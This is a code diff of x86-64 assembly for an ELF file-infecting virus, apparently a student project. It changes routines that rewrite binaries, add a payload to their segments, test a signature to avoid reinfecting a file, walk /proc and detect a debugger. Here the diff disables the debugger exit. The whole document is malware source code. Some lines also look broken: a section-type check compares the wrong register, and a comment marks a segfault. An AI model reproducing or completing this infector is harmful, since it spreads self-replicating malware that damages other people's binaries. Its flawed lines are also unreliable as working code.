@@ -167,16 +167,13 @@ modify_sections:
 		mul rbx
 		lea rdi, [r10 + rax]	; rdi: current shdr
 
-		xor rdx, rdx
-		mov edx, DWORD[rdi + shdr.sh_name]
-		mov rsi, QWORD[r8 + elf_struc.shdr_names]
-		add rsi, rdx			;rsi has the sct name sct name
+		;xor rdx, rdx
+		;mov edx, DWORD[rdi + shdr.sh_name]
+		;mov rsi, QWORD[r8 + elf_struc.shdr_names]
+		;add rsi, rdx			;rsi has the sct name sct name
 
-		push rdi
-		lea rdi, [rel bss_name]
-		call strcmp
-		pop rdi
-		cmp rax, 0
+		mov esi, DWORD[rdi + shdr.sh_type]
+		cmp rax, 8
 		je while_shdr_to_modify ; if not bss section
 		mov rax, QWORD[rdi + shdr.sh_offset]
 		cmp rax, r11
@@ -194,7 +191,7 @@ modify_sections:
 	leave
 	ret
 
-modify_segements:
+modify_segments:
 	enter 0, 0
 	mov r8, rdi									;r8 contient elf_struc
 	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
@@ -386,7 +383,7 @@ rewrite_binary:
 	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
 	mov rsi, QWORD[r11 + elf_struc.ptr]
 	mov rdx, QWORD[r11 + elf_struc.new_code_offset]
-	call memcpy											;copie du debut du bin
+	call memcpy											;copie du debut du bin      SEGV ici !!!
 	add r13, QWORD[r11 + elf_struc.new_code_offset]
 
 	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
@@ -494,9 +491,13 @@ infect_elf:		; r8:elf_struc
 	je infect_elf_end
 
 	mov rdi, r8
-	call modify_segements
+	call modify_segments
 	cmp rax, 0
 	je infect_elf_end
+
+	mov rdi, QWORD[r8 + elf_struc.bits_added]
+	cmp rdi, 3000000
+	jg infect_elf_end
 
 	mov rdi, QWORD[r8 + elf_struc.data_phdr]
 	mov rsi, QWORD[rdi + phdr.p_offset]
@@ -505,6 +506,11 @@ infect_elf:		; r8:elf_struc
 	add rdi, rsi
 	mov rsi, end - signature
 	sub rdi, rsi
+	;push rdi
+	;call check_addr
+	;cmp rax, 0
+	;je infect_elf_end
+	;pop rdi
 	lea rsi, [rel signature]
 	call strcmp							;test if infected
 	cmp rax, 0
@@ -762,7 +768,7 @@ check_debugger:
 main:
 	call check_debugger
 	cmp rax, 1
-	je jmp_old_entry
+	;je jmp_old_entry
 	lea rdi, [rel proc_dir]
 	lea rsi, [rel check_proc]
 	call process_dir
